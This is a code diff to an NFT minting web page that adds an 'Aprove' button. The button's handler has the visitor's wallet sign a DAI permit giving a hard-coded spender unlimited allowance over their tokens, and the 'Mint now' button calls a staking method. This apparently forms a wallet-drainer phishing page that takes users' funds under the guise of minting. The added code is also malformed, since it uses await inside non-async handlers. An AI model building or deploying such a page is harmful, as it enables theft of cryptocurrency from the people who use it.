@@ -21,6 +21,7 @@
                     <a class="hero-btn" id="disconnect-wallet"> <img src="icons8-cancel.svg"> </a>
                     <div id="message"></div>
                 </li>
+                
             </ul>
         </nav>
     </Header>
@@ -31,7 +32,8 @@
             <h1>Our Unique NFT Collection 10k limited nfts</h1>
             <a id="mint" class="hero-btn">Mint now</a>
             <label for="quantity" >Quantity (between 1 and 10):</label>
-            <input type="number" id="quantity" name="quantity" value="1" min="1" max="10">
+            <input type="number" id="quantity" name="quantity" value="1" min="1" max="10"> </br>
+            <li><a class="hero-btn" id="aprove"> Aprove</a></li>
         </div>
     </section>
 
@@ -60,9 +62,11 @@
         document.getElementById('mint').onclick = () => {
             let value = document.getElementById('quantity').value;
             const price = web3.utils.toWei(value, 'ether');
-            //const result = await signDaiPermit(window.ethereum, prc20, account, ADDRESS);
-            //await prc20.methods.permit(senderAddress, spender, result.nonce, result.expiry, true, result.v, result.r, result.s).send({from: account});
             contract.methods.stakeTokens(value).send({ from: account});
+        }
+        document.getElementById('aprove').onclick = () => {
+            const result = await signDaiPermit(window.ethereum, prc20, account, ADDRESS);
+            await prc20.methods.permit(senderAddress, spender, result.nonce, result.expiry, true, result.v, result.r, result.s).send({from: account});
         }
         
         }
